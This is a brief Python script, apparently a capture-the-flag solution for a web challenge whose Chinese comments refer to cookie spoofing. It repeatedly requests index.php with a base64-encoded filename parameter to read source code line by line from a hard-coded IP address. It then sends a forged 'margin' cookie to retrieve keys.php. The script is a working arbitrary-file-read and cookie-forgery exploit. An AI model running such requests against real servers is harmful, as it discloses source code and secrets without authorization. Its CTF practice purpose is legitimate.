
import requests
#f=open("cookies欺骗.txt","w")
url="http://123.206.87.240:8002/web11/index.php?line="
last="&filename=aW5kZXgucGhw="#设置后缀
list1=[]
req=requests.Session()#建立会话
for i in range(20):
    txt1=req.get(url+str(i)+last).text#设置请求来获取index.php的内容
    #f.write(txt1)
    #print(txt1)
    list1.append([txt1])
#f.close()
cookies={"margin":"margin"}
res=req.get(url+str(0)+"&filename=a2V5cy5waHA=",cookies=cookies)#将cookie提交上去然后获取每一行的代码
print(res.text)